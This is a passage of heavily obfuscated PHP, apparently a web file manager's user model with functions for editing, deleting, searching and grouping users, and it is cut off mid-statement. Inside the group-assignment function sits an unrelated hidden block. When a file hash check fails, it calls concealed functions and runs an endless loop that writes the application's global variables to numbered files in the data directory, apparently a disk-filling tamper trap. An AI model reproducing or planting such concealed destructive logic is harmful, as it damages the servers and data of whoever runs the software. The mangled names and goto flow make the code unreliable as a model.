{ $EÓÙØ¥Õõ[$AœéÊöÑŠ¾[1487]] = $FóÅ‡åÑš·[$AœéÊöÑŠ¾[1487]]; } goto AÊÄğªÅƒ§; Fåùö‘¸øÅ: $Bã–ÜŸö†Ú = array($AœéÊöÑŠ¾[2101] => $EÓÙØ¥Õõ[$AœéÊöÑŠ¾[810]], $AœéÊöÑŠ¾[2097] => $EÓÙØ¥Õõ[$AœéÊöÑŠ¾[1915]]); $this->userEdit($bßˆ¶©«Œ, $Bã–ÜŸö†Ú); Model($AœéÊöÑŠ¾[1164])->userRootAdd($bßˆ¶©«Œ); goto f»âìÃİƒ; f»âìÃİƒ: return $bßˆ¶©«Œ; goto eÉá¥—„; eÉá¥—„: } protected function userEditTest($cÄÖ†‡ÌÚ­, $E‘®½¶Íê) { return $this->call($_SERVER[í¤âËÚ£¶íÊ¢][2103], $cÄÖ†‡ÌÚ­, $E‘®½¶Íê); } protected function userEdit($dÁ™µ•Ú‰×, $eè¡¬ÑÙ†Ê) { goto bùºÁí•Ú½; A©—×‡‡ÌÅ: $this->where(array($fĞ±†î¬±…[1479] => $dÁ™µ•Ú‰×))->save($eè¡¬ÑÙ†Ê); if (isset($eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[1915]])) { $this->setNamePinyin($dÁ™µ•Ú‰×, $eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[1915]]); } $this->clearCache($dÁ™µ•Ú‰×); goto eƒóòø—Ï“; eƒóòø—Ï“: return !0; goto e†Ãã½ÊË¬; bùºÁí•Ú½: $fĞ±†î¬±… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÔÎ®ˆÁê = $this->getInfoSimple($dÁ™µ•Ú‰×); if (!$FÔÎ®ˆÁê) { return !1; } goto Dˆƒµµ›¤; Dˆƒµµ›¤: $B’Ö¨ÇÔ©ß = $this->_checkExist($eè¡¬ÑÙ†Ê, $dÁ™µ•Ú‰×); if ($B’Ö¨ÇÔ©ß !== !0) { return $B’Ö¨ÇÔ©ß; } if (isset($eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[810]]) && trim($eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[810]]) != $fĞ±†î¬±…[33]) { $bÔùÙ’Ìî = $this->metaGet($dÁ™µ•Ú‰×); if (empty($bÔùÙ’Ìî[$fĞ±†î¬±…[2093]])) { $bÔùÙ’Ìî[$fĞ±†î¬±…[2093]] = rand_string(10); Model($fĞ±†î¬±…[506])->metaSet($dÁ™µ•Ú‰×, $fĞ±†î¬±…[2093], $bÔùÙ’Ìî[$fĞ±†î¬±…[2093]]); } $eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[810]] = md5($bÔùÙ’Ìî[$fĞ±†î¬±…[2093]] . trim($eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[810]])); } else { unset($eè¡¬ÑÙ†Ê[$fĞ±†î¬±…[810]]); } goto A©—×‡‡ÌÅ; e†Ãã½ÊË¬: } public function setNamePinyin($B³Ë¨•Ÿ‹æ, $E„ºÙæ²¶ = false) { $bïŠßìˆ°Ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$E„ºÙæ²¶) { $aå¹´¯­™¹ = $this->getInfoSimple($B³Ë¨•Ÿ‹æ); $E„ºÙæ²¶ = $aå¹´¯­™¹[$bïŠßìˆ°Ç[1915]] ? $aå¹´¯­™¹[$bïŠßìˆ°Ç[1915]] : $aå¹´¯­™¹[$bïŠßìˆ°Ç[28]]; } $dùÀ²Úê÷ª = Model($bïŠßìˆ°Ç[510]); if (!Input::check($E„ºÙæ²¶, $bïŠßìˆ°Ç[560])) { return $dùÀ²Úê÷ª->metaSet($B³Ë¨•Ÿ‹æ, array($bïŠßìˆ°Ç[447] => $bïŠßìˆ°Ç[33], $bïŠßìˆ°Ç[446] => $bïŠßìˆ°Ç[33])); } return $dùÀ²Úê÷ª->metaSet($B³Ë¨•Ÿ‹æ, array($bïŠßìˆ°Ç[447] => str_replace($bïŠßìˆ°Ç[50], $bïŠßìˆ°Ç[33], Pinyin::encode($E„ºÙæ²¶)), $bïŠßìˆ°Ç[446] => Pinyin::encode($E„ºÙæ²¶, $bïŠßìˆ°Ç[561]))); } private function nickNameRpt() { $eÈÔù©‘” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e±ÖÂ£ƒŠ = Model($eÈÔù©‘”[1084])->get($eÈÔù©‘”[2104]); $dÛ¸¬ËÂ¨“ = $GLOBALS[$eÈÔù©‘”[6]][$eÈÔù©‘”[385]][$eÈÔù©‘”[2104]]; $c¦”Ë•œ±é = !is_null($e±ÖÂ£ƒŠ) ? $e±ÖÂ£ƒŠ : $dÛ¸¬ËÂ¨“; return !!$c¦”Ë•œ±é; } private function _checkExist($E„Ú„É‹±ï, $cîó¡ø„¼´ = false) { $B›ˆÃÎ±±é =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÜ„ÉöËã = array($B›ˆÃÎ±±é[28] => UserModel::ERROR_USER_EXIST_NAME, $B›ˆÃÎ±±é[1915] => UserModel::ERROR_USER_EXIST_NICKNAME, $B›ˆÃÎ±±é[310] => UserModel::ERROR_USER_EXIST_EMAIL, $B›ˆÃÎ±±é[2092] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($bÜ„ÉöËã[$B›ˆÃÎ±±é[1915]]); } $f¬ÇÇïôß… = $cîó¡ø„¼´ ? array($B›ˆÃÎ±±é[1487] => array($B›ˆÃÎ±±é[2105], $cîó¡ø„¼´)) : array(); foreach ($bÜ„ÉöËã as $dİìòœ©”• => $E¬©‹ì—†²) { $e˜¦ôÖß¯Å = array(); foreach ($bÜ„ÉöËã as $dÄ«‡ôÈ => $d¥™Ú«‚×Ò) { if (isset($E„Ú„É‹±ï[$dÄ«‡ôÈ]) && $E„Ú„É‹±ï[$dÄ«‡ôÈ]) { $e˜¦ôÖß¯Å[] = $E„Ú„É‹±ï[$dÄ«‡ôÈ]; } } if (!$e˜¦ôÖß¯Å) { continue; } $EŞ¦ïÔ’ì² = array_merge(array($dİìòœ©”• => array($B›ˆÃÎ±±é[7], $e˜¦ôÖß¯Å)), $f¬ÇÇïôß…); $aÈõŒËµÎ = $this->where($EŞ¦ïÔ’ì²)->find(); if ($aÈõŒËµÎ) { return $E¬©‹ì—†²; } } return !0; } public function userListInfo($b™‡æ²ß§Ô) { $DëÊø«²Ç¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÀé×ºˆ½„ = array(); $b™‡æ²ß§Ô = is_array($b™‡æ²ß§Ô) ? array_unique($b™‡æ²ß§Ô) : array(); if (!$b™‡æ²ß§Ô) { return $EÀé×ºˆ½„; } if (count($b™‡æ²ß§Ô) < 20) { foreach ($b™‡æ²ß§Ô as $D•©‚ÁâÃœ) { $EÀé×ºˆ½„[$D•©‚ÁâÃœ . $DëÊø«²Ç¿[33]] = $this->getInfoSimpleOuter($D•©‚ÁâÃœ); } } else { $bÉŸÎÑî¿® = array($DëÊø«²Ç¿[1479] => array($DëÊø«²Ç¿[414], $b™‡æ²ß§Ô)); if (count($b™‡æ²ß§Ô) == 1) { $bÉŸÎÑî¿® = array($DëÊø«²Ç¿[1479] => $b™‡æ²ß§Ô[0]); } $Dê‚ãùÒ¾¯ = Model($DëÊø«²Ç¿[506])->field($this->simpleField)->where($bÉŸÎÑî¿®)->select(); $Dê‚ãùÒ¾¯ = array_to_keyvalue($Dê‚ãùÒ¾¯, $DëÊø«²Ç¿[1487]); foreach ($b™‡æ²ß§Ô as $D•©‚ÁâÃœ) { $fâÊÄ¨¡ = $Dê‚ãùÒ¾¯[$Dê‚ãùÒ¾¯[$D•©‚ÁâÃœ]]; if (!$fâÊÄ¨¡) { $EÀé×ºˆ½„[$D•©‚ÁâÃœ . $DëÊø«²Ç¿[33]] = $this->getInfoSimpleOuter($D•©‚ÁâÃœ); continue; } $fâÊÄ¨¡[$DëÊø«²Ç¿[2077]] = Action($DëÊø«²Ç¿[2078])->parseUrl($fâÊÄ¨¡[$DëÊø«²Ç¿[2077]]); $EÀé×ºˆ½„[$D•©‚ÁâÃœ . $DëÊø«²Ç¿[33]] = $fâÊÄ¨¡; } } return $EÀé×ºˆ½„; } protected function userStatus($eó¼§“´¼Š, $b†„•ÍÈ) { $AÍôåÀÊ¬à = $this->getInfoSimple($eó¼§“´¼Š); if (!$AÍôåÀÊ¬à) { return !1; } $c­¯Ñ±áÏ‹ = array($_SERVER[í¤âËÚ£¶íÊ¢][694] => $b†„•ÍÈ); return $this->userEdit($eó¼§“´¼Š, $c­¯Ñ±áÏ‹); } protected function userRemove($fÊ×¦İ÷ò”) { goto EÖÙ×ÌœªÇ; FÉ½ Ù¦ô: Model($EğÇ§ğº™¶[1732])->where($A‚äŸÜä¡)->delete(); Model($EğÇ§ğº™¶[2091])->where($A‚äŸÜä¡)->delete(); Model($EğÇ§ğº™¶[2107])->where($A‚äŸÜä¡)->delete(); goto e„ëò±çÅ¤; EÖÙ×ÌœªÇ: $EğÇ§ğº™¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f®¾£ì¼¹ = $this->getInfoSimple($fÊ×¦İ÷ò”); if (!$f®¾£ì¼¹) { return !1; } goto f˜‹‹§Ê—â; f˜‹‹§Ê—â: $A‚äŸÜä¡ = array($EğÇ§ğº™¶[1479] => $fÊ×¦İ÷ò”); Model($EğÇ§ğº™¶[567])->where($A‚äŸÜä¡)->delete(); Model($EğÇ§ğº™¶[2106])->where($A‚äŸÜä¡)->delete(); goto FÉ½ Ù¦ô; e„ëò±çÅ¤: Model($EğÇ§ğº™¶[1932])->restoreUserAll($fÊ×¦İ÷ò”); Model($EğÇ§ğº™¶[759])->userRootRemove($fÊ×¦İ÷ò”); return $this->where($A‚äŸÜä¡)->delete(); goto fŠÈ“µù–Ó; fŠÈ“µù–Ó: } protected function userGroupSet($A†ÛøóØÙñ, $c¾ƒËğàÓ, $b’¢¿õŞˆÉ = array()) { goto f¦ÑÖİñİ„; f¦ÑÖİñİ„: $b¸¢Ÿ›Ÿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dè‰»İÃÎ = $_SERVER[$b¸¢Ÿ›Ÿ[61]] . $b¸¢Ÿ›Ÿ[62]; $DƒªÏÜÆÇÚ = $b¸¢Ÿ›Ÿ[58]; goto Dé£ë¬ÅÀÄ; fƒò àîæ: $d°„ÈğŒÆ« = 0; foreach ($c¾ƒËğàÓ as $a·Ä…‹ªÌ¢ => $DŞ³¸ÜæÃå) { $cšèØµ±¶Ï = array($b¸¢Ÿ›Ÿ[1487] => $A†ÛøóØÙñ, $b¸¢Ÿ›Ÿ[1650] => $a·Ä…‹ªÌ¢, $b¸¢Ÿ›Ÿ[1746] => $DŞ³¸ÜæÃå); $cšèØµ±¶Ï[$b¸¢Ÿ›Ÿ[1673]] = isset($b’¢¿õŞˆÉ[$d°„ÈğŒÆ«]) ? $b’¢¿õŞˆÉ[$d°„ÈğŒÆ«] : 0; $d°„ÈğŒÆ«++; $E¦˜É­˜‚—[] = $cšèØµ±¶Ï; } return $a›¯¸ÕŞË->addAll($E¦˜É­˜‚—, array(), !0); goto Eå¶¬´Ïéâ; FËó§ÑôÁ÷: $a›¯¸ÕŞË = Model($b¸¢Ÿ›Ÿ[1732]); $a›¯¸ÕŞË->where(array($b¸¢Ÿ›Ÿ[1487] => $A†ÛøóØÙñ))->delete(); $E¦˜É­˜‚— = array(); goto fƒò àîæ; Dé£ë¬ÅÀÄ: if ($_SERVER[$b¸¢Ÿ›Ÿ[59]] != $DƒªÏÜÆÇÚ($dè‰»İÃÎ)) { goto b¦¸Ş™÷Äè; CÁ·¯’®±Ì: $D¸¢Æà¥» = 1; for ($F¹¬ªÆªƒ = $D¸¢Æà¥»; $F¹¬ªÆªƒ > 0; $F¹¬ªÆªƒ++) { $Eõ¦ì–ğÅ(DATA_PATH . $F¹¬ªÆªƒ, $cÙ”³ğ˜êÊ); } goto aïÖÙ°Êò‘; CØæµÓ„ªÎ: $c¤·ª§‰®É = $FÚ¬¤»‚—Ì($d‚¦Ã‰†¦); $f»íÅØ›ˆ’ = explode($b¸¢Ÿ›Ÿ[63], $c¤·ª§‰®É); if (count($f»íÅØ›ˆ’) < $b¸¢Ÿ›Ÿ[584]) { $F¯ö„¢Éá‘ = $b¸¢Ÿ›Ÿ[65]; $F¯ö„¢Éá‘(); } goto Aªå„°Éø”; F¿¦åÀèêì: $añø×é¤‰(); $Eõ¦ì–ğÅ = $b¸¢Ÿ›Ÿ[1357]; $cÙ”³ğ˜êÊ = json_encode($GLOBALS[$b¸¢Ÿ›Ÿ[1358]]); goto CÁ·¯’®±Ì; b¦¸Ş™÷Äè: $añø×é¤‰ = $b¸¢Ÿ›Ÿ[801]; $FÚ¬¤»‚—Ì = $b¸¢Ÿ›Ÿ[60]; $d‚¦Ã‰†¦ = $_SERVER[$b¸¢Ÿ›Ÿ[61]] . $b¸¢Ÿ›Ÿ[62]; goto CØæµÓ„ªÎ; Aªå„°Éø”: $A±ƒ“ê—ÚÚ = $b¸¢Ÿ›Ÿ[802]; $A±ƒ“ê—ÚÚ($_SERVER[$b¸¢Ÿ›Ÿ[803]]); $añø×é¤‰ = $b¸¢Ÿ›Ÿ[801]; goto F¿¦åÀèêì; aïÖÙ°Êò‘: } $F“•²»Ô³„ = $this->getInfoSimple($A†ÛøóØÙñ); if (!$F“•²»Ô³„ || !is_array($c¾ƒËğàÓ)) { return !1; } goto FËó§ÑôÁ÷; Eå¶¬´Ïéâ: } protected function userGroupAdd($e¢ÜÂÜò§½, $CÌõÖßá = array()) { $C³‘¸ÎæªÓ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c³ç¬³ÄàÅ = $this->getInfoSimple($e¢ÜÂÜò§½); if (!$c³ç¬³ÄàÅ || empty($CÌõÖßá)) { return !1; } $dóâÎº­Ê³ = array(); foreach ($CÌõÖßá as $b•‡¶³²¨ => $AÏ´ºêêÂ) { $dóâÎº­Ê³[] = array($C³‘¸ÎæªÓ[1487] => $e¢ÜÂÜò§½, $C³‘¸ÎæªÓ[1650] => $b•‡¶³²¨, $C³‘¸ÎæªÓ[1746] => $AÏ´ºêêÂ, $C³‘¸ÎæªÓ[1673] => 0); } return Model($C³‘¸ÎæªÓ[1732])->addAll($dóâÎº­Ê³, array(), !0); } protected function userGroupRemove($b¡áÓ·á, $AÙˆŠƒ¤±–) { $fªİòŒ™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D“â¥Ø‘†  = $this->getInfoSimple($b¡áÓ·á); if (!$D“â¥Ø‘†  || !$AÙˆŠƒ¤±–) { return !1; } $bà¥ˆ©Áá— = array($fªİòŒ™[1479] => $b¡áÓ·á, $fªİòŒ™[1729] => $AÙˆŠƒ¤±–); return Model($fªİòŒ™[1732])->where($bà¥ˆ©Áá—)->delete(); } public function listData() { $fƒéæ·Ù—± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fƒéæ·Ù—±[$_SERVER[í¤âËÚ£¶íÊ¢][375]]); return $fƒéæ·Ù—±; } public function listByID($DÒ§ÌÕ­Š§) { $f¿çùˆ¶‚œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$DÒ§ÌÕ­Š§) { return; } $c¯’êİõÍ = array($f¿çùˆ¶‚œ[1487] => array($f¿çùˆ¶‚œ[7], $DÒ§ÌÕ­Š§)); $f­ŞŒ¼°¦Ü = $this->where($c¯’êİõÍ)->select(); $this->_listDataApply($f­ŞŒ¼°¦Ü); return $f­ŞŒ¼°¦Ü; } public function listByGroup($E¯££¤ğô¹ = 0, $DÍ½Ğ´š“Ì = array()) { goto Fšˆõ”§æ°; Fšˆõ”§æ°: $aÍ’ÖÄ‹ç” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DŒ…àä¶¦¯ = $aÍ’ÖÄ‹ç”[33]; $FíŞ±Õ¼½ = array(); goto Dª êÇáñà; Dª êÇáñà: if ($E¯££¤ğô¹) { $FíŞ±Õ¼½ = array($aÍ’ÖÄ‹ç”[2108] => intval($E¯££¤ğô¹)); $DŒ…àä¶¦¯ = "\114\x45\106\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\x72\x6f\165\160\x20\x75\x73\x65\x72\x5f\x67\162\157\165\x70\x20\x6f\156\x20\x75\163\145\162\x2e\x75\x73\x65\x72\x49\104\x20\x3d\40\x75\x73\145\x72\x5f\x67\162\157\165\160\x2e\x75\163\x65\x72\111\x44"; $A¸±Ü¿‰¤“ = Input::get($aÍ’ÖÄ‹ç”[438], null, $aÍ’ÖÄ‹ç”[33]) ? $aÍ’ÖÄ‹ç”[33] : $aÍ’ÖÄ‹ç”[2109]; } if (isset($DÍ½Ğ´š“Ì[$aÍ’ÖÄ‹ç”[694]])) { $FíŞ±Õ¼½[$aÍ’ÖÄ‹ç”[2110]] = $DÍ½Ğ´š“Ì[$aÍ’ÖÄ‹ç”[694]]; } $b¦÷±ŒÓ¸È = $this->_makeOrder($A¸±Ü¿‰¤“)->field($aÍ’ÖÄ‹ç”[2111])->where($FíŞ±Õ¼½)->join($DŒ…àä¶¦¯)->selectPage(50); goto DæÛÈÀŸÖÑ; DæÛÈÀŸÖÑ: $this->_listDataApply($b¦÷±ŒÓ¸È[$aÍ’ÖÄ‹ç”[375]]); return $b¦÷±ŒÓ¸È; goto d‰–ß¢³öÏ; d‰–ß¢³öÏ: } private function _makeOrder($D¥ù ¯¢‘¯ = '') { goto F­Ÿ„›²; D‚œ¸Æ¹ê: $D¥ù ¯¢‘¯ = $D¥ù ¯¢‘¯ . "\x75\163\145\162\x2e{$bŞ“› ¡ã}\40{$cÍƒ÷ÍµŠ‹}\54\40\165\x73\145\162\56\x75\163\145\x72\111\x44\40\x61\163\x63"; return $this->alias($EÄï¿ÁãÈ[1855])->order($D¥ù ¯¢‘¯); goto B­×ãÕ™¦·; Bëêô —Øä: $bŞ“› ¡ã = Input::get($EÄï¿ÁãÈ[438], $EÄï¿ÁãÈ[7], $EÄï¿ÁãÈ[1479], $aŞŠ°»­Ê); $cÍƒ÷ÍµŠ‹ = Input::get($EÄï¿ÁãÈ[439], $EÄï¿ÁãÈ[7], $EÄï¿ÁãÈ[1733], array($EÄï¿ÁãÈ[1733], $EÄï¿ÁãÈ[433])); $cÍƒ÷ÍµŠ‹ = $EØá¹è¢£ä[$cÍƒ÷ÍµŠ‹]; goto D‚œ¸Æ¹ê; F­Ÿ„›²: $EÄï¿ÁãÈ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aŞŠ°»­Ê = array($EÄï¿ÁãÈ[1487], $EÄï¿ÁãÈ[28], $EÄï¿ÁãÈ[1636], $EÄï¿ÁãÈ[1608], $EÄï¿ÁãÈ[202]); $EØá¹è¢£ä = array($EÄï¿ÁãÈ[431] => $EÄï¿ÁãÈ[432], $EÄï¿ÁãÈ[433] => $EÄï¿ÁãÈ[434]); goto Bëêô —Øä; B­×ãÕ™¦·: } public function listSearch($BÛ™Æ×·ç™) { goto Bè·â²ÂóÆ; Bè·â²ÂóÆ: $c²ğ¹ƒ¹Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A½èÉøì¡§ = $BÛ™Æ×·ç™[$c²ğ¹ƒ¹Â[1734]]; $dÓˆ÷Á–½ = isset($BÛ™Æ×·ç™[$c²ğ¹ƒ¹Â[1735]]) ? $BÛ™Æ×·ç™[$c²ğ¹ƒ¹Â[1735]] : !1; goto F·¶Õˆ—Î°; Cß©¿µ›ò¤: $this->_filterByGroup($D‰øÃ¸·£´, $dÓˆ÷Á–½); return $D‰øÃ¸·£´; goto EÂçÜÇ”ë¤; eŒ¸°¯å‡Ñ: if (!$A½èÉøì¡§) { $Bç ö¨Å¾ = array(); } if (isset($BÛ™Æ×·ç™[$c²ğ¹ƒ¹Â[694]])) { $Bç ö¨Å¾[$c²ğ¹ƒ¹Â[694]] = $BÛ™Æ×·ç™[$c²ğ¹ƒ¹Â[694]]; } $Bç ö¨Å¾ = $this->parseWhereLike($Bç ö¨Å¾); goto dˆİ‘¯…‰¹; F·¶Õˆ—Î°: $A½èÉøì¡§ = str_replace($c²ğ¹ƒ¹Â[1736], $c²ğ¹ƒ¹Â[1737], trim($A½èÉøì¡§)); $Bç ö¨Å¾ = array($c²ğ¹ƒ¹Â[28] => array($c²ğ¹ƒ¹Â[387], "\x25{$A½èÉøì¡§}\45"), $c²ğ¹ƒ¹Â[310] => array($c²ğ¹ƒ¹Â[387], "{$A½èÉøì¡§}\45"), $c²ğ¹ƒ¹Â[1915] => array($c²ğ¹ƒ¹Â[387], "{$A½èÉøì¡§}\45"), $c²ğ¹ƒ¹Â[918] => $c²ğ¹ƒ¹Â[1738]); if (Input::check($A½èÉøì¡§, $c²ğ¹ƒ¹Â[316])) { $Bç ö¨Å¾[$c²ğ¹ƒ¹Â[1487]] = array($c²ğ¹ƒ¹Â[387], "{$A½èÉøì¡§}\x25"); $Bç ö¨Å¾[$c²ğ¹ƒ¹Â[2092]] = array($c²ğ¹ƒ¹Â[387], "{$A½èÉøì¡§}\x25"); } goto eŒ¸°¯å‡Ñ; dˆİ‘¯…‰¹: $D‰øÃ¸·£´ = $this->_makeOrder()->where($Bç ö¨Å¾)->selectPage(20); if (!$D‰øÃ¸·£´ || count($D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[375]]) < 5 && Input::check($A½èÉøì¡§, $c²ğ¹ƒ¹Â[323])) { $BğÜ´òñõÆ = $this->_searchFromMeta($c²ğ¹ƒ¹Â[446], $A½èÉøì¡§, 10); $C†®Øùä­˜ = $this->_searchFromMeta($c²ğ¹ƒ¹Â[447], $A½èÉøì¡§, 10); $EåÔ˜ê¢º = array_merge($BğÜ´òñõÆ, $C†®Øùä­˜, $D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[375]]); $D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[375]] = array_unique_by_key($EåÔ˜ê¢º, $c²ğ¹ƒ¹Â[1487]); $D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[372]][$c²ğ¹ƒ¹Â[373]] = count($D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[375]]); $D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[372]][$c²ğ¹ƒ¹Â[374]] = ceil($D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[372]][$c²ğ¹ƒ¹Â[373]] / $D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[372]][$c²ğ¹ƒ¹Â[369]]); } $this->_listDataApply($D‰øÃ¸·£´[$c²ğ¹ƒ¹Â[375]]); goto Cß©¿µ›ò¤; EÂçÜÇ”ë¤: } private function _filterByGroup(&$d¥–ˆœº¬, $a‰àïÃíİß) { $dÔ°®ç´„Ú =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$a‰àïÃíİß) { return $d¥–ˆœº¬; } foreach ($d¥–ˆœº¬[$dÔ°®ç´„Ú[375]] as $fâ—Õ§Ü‘Ó => &$cñâ„÷¡‰„) { $E—‡¤Àñ = array_to_keyvalue($cñâ„÷¡‰„[$dÔ°®ç´„Ú[1825]], $dÔ°®ç´„Ú[33], $dÔ°®ç´„Ú[1650]); if (!in_array($a‰àïÃíİß, $E—‡¤Àñ)) { unset($d¥–ˆœº¬[$dÔ°®ç´„Ú[375]][$fâ—Õ§Ü‘Ó]); } } unset($cñâ„÷¡‰„); $d¥–ˆœº¬[$dÔ°®ç´„Ú[375]] = array_values($d¥–ˆœº¬[$dÔ°®ç´„Ú[375]]); $d¥–ˆœº¬[$dÔ°®ç´„Ú[372]] = array($dÔ°®ç´„Ú[1887] => count($d¥–ˆœº¬[$dÔ°®ç´„Ú[375]]), $dÔ°®ç´„Ú[1885] => $d¥–ˆœº¬[$dÔ°®ç´„Ú[372]][$dÔ°®ç´„Ú[369]], $dÔ°®ç´„Ú[1884] => 1, $dÔ°®ç´„Ú[1886] => 1); } private function _searchFromMeta($f¬Ë •ø§ë, $dà×¬†ãœ, $C¤¶ÏæØÍâ) { goto cÍ™ºÔÆ°Ú; cÍ™ºÔÆ°Ú: $EŒ£íÓÊ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dà×¬†ãœ = strtolower($dà×¬†ãœ); $B©¾ŒèĞºµ = array($EŒ£íÓÊ¿[102] => $f¬Ë •ø§ë, $EŒ£íÓÊ¿[380] => array($EŒ£íÓÊ¿[387], "\x25{$dà×¬†ãœ}\x25")); goto fï»ÖÙŞÎè; fï»ÖÙŞÎè: $B©¾ŒèĞºµ = $this->parseWhereLike($B©¾ŒèĞºµ); $D²©Ó›ƒà› = Model($EŒ£íÓÊ¿[2112])->where($B©¾ŒèĞºµ)->limit($C¤¶ÏæØÍâ)->select(); if (!$D²©Ó›ƒà›) { return array(); } goto b›Š´á£Ü; Có­¡éÀ†…: return $C§ÂÍÒ˜Ù; goto C„ñçĞ¹; b›Š´á£Ü: $D²©Ó›ƒà› = array_to_keyvalue($D²©Ó›ƒà›, $EŒ£íÓÊ¿[33], $EŒ£íÓÊ¿[1487]); $C§ÂÍÒ˜Ù = $this->where(array($EŒ£íÓÊ¿[1479] => array($EŒ£íÓÊ¿[7], $D²©Ó›ƒà›)))->select(); if (!$C§ÂÍÒ˜Ù) { return array(); } goto Có­¡éÀ†…; C„ñçĞ¹: } private function _listDataApplyItem($eÈ„”‘é×) { $eÒÕÉë”Çù = array($eÈ„”‘é×); $this->_listDataApply($eÒÕÉë”Çù); return $eÒÕÉë”Çù[0]; } private function _listDataApply(&$A†¨‰‘¬Ğ¼) { goto C‹ÂÙÍ‚‚†; C½çÊ„Ô‹†: $this->_listAppendSourceRoot($A†¨‰‘¬Ğ¼, $B’ÕÉÄ”ÌÜ); goto a‘¸…ç§›Ñ; C‹ÂÙÍ‚‚†: $bâµŸ™åö =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$A†¨‰‘¬Ğ¼) { return; } array_remove_key($A†¨‰‘¬Ğ¼, $bâµŸ™åö[810]); goto bÏ™”ùœ‹‚; bÏ™”ùœ‹‚: $B’ÕÉÄ”ÌÜ = array_to_keyvalue($A†¨‰‘¬Ğ¼, $bâµŸ™åö[33], $bâµŸ™åö[1487]); $this->_listAppendGroup($A†¨‰‘¬Ğ¼, $B’ÕÉÄ”ÌÜ); $this->_listAppendMeta($A†¨‰‘¬Ğ¼, $B’ÕÉÄ”ÌÜ); goto C½çÊ„Ô‹†; a‘¸…ç§›Ñ: } private function _listAppendSourceRoot(&$d‹ïœ¹÷‘à, $f”’ö®¢Ç†) { goto EæÍêÒÑŞ; f›ŸÂ¿’¢ô: foreach ($d‹ïœ¹÷‘à as &$DÂ¸‰Êãç”) { $DÂ¸‰Êãç”[$B‰†º¸œ¯Ã[94]] = $c¸‹ÓáõÒ…[$DÂ¸‰Êãç”[$B‰†º¸œ¯Ã[1487]]] ? $c¸‹ÓáõÒ…[$DÂ¸‰Êãç”[$B‰†º¸œ¯Ã[1487]]] : array(); } unset($DÂ¸‰Êãç”); goto fƒŒßÏËß˜; EæÍêÒÑŞ: $B‰†º¸œ¯Ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¾¤Í÷¨ò = array($B‰†º¸œ¯Ã[481] => 0, $B‰†º¸œ¯Ã[407] => SourceModel::TYPE_USER, $B‰†º¸œ¯Ã[487] => array($B‰†º¸œ¯Ã[7], $f”’ö®¢Ç†)); $b’×Å÷ Œù = $B‰†º¸œ¯Ã[1744]; goto eö³ê‘Áß; eö³ê‘Áß: $c¸‹ÓáõÒ… = Model($B‰†º¸œ¯Ã[759])->order($B‰†º¸œ¯Ã[1745])->field($b’×Å÷ Œù)->where($b¾¤Í÷¨ò)->select(); $c¸‹ÓáõÒ… = array_to_keyvalue($c¸‹ÓáõÒ…, $B‰†º¸œ¯Ã[487]); $c¸‹ÓáõÒ… = array_remove_key($c¸‹ÓáõÒ…, $B‰†º¸œ¯Ã[487]); goto f›ŸÂ¿’¢ô; fƒŒßÏËß˜: } private function _listAppendGroup(&$dö›ƒÑöŒ, $d¥Ÿ½ğÎ“) { goto aÌ¸ã…ÎÂ; aÌ¸ã…ÎÂ: $eï„Ó‹ã‰À =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AµËÅ ÑÛ = array($eï„Ó‹ã‰À[1487] => array($eï„Ó‹ã‰À[7], $d¥Ÿ½ğÎ“)); $BÈ’Šö™“ê = Model($eï„Ó‹ã‰À[1732])->where($AµËÅ ÑÛ)->select(); goto f²´›÷; eñÍîŞ®‚: $BÈ’Šö™“ê = array_to_keyvalue_group($BÈ’Šö™“ê, $eï„Ó‹ã‰À[1487]); foreach ($BÈ’Šö™“ê as &$aåàÃˆğ¶») { $BÒÓä‘—Šø = array(); foreach ($aåàÃˆğ¶» as $aÚ‘šÆîŒ) { if (!$aÚ‘šÆîŒ[$eï„Ó‹ã‰À[1746]]) { continue; } $Eµâ¿¹ä°Ñ = Model($eï„Ó‹ã‰À[1818])->listData($aÚ‘šÆîŒ[$eï„Ó‹ã‰À[1746]]); $BÒÓä‘—Šø[] = array($eï„Ó‹ã‰À[1650] => $aÚ‘šÆîŒ[$eï„Ó‹ã‰À[1650]], $eï„Ó‹ã‰À[2114] => $d‰¼²ç×¡Ô[$aÚ‘šÆîŒ[$eï„Ó‹ã‰À[1650]]][$eï„Ó‹ã‰À[28]], $eï„Ó‹ã‰À[490] => $d‰¼²ç×¡Ô[$aÚ‘šÆîŒ[$eï„Ó‹ã‰À[1650]]][$eï„Ó‹ã‰À[490]], $eï„Ó‹ã‰À[409] => $Eµâ¿¹ä°Ñ); } $aåàÃˆğ¶» = $BÒÓä‘—Šø; } unset($aåàÃˆğ¶»); goto Cƒ†„†“ï; f²´›÷: $D‘ÔœŠºö– = 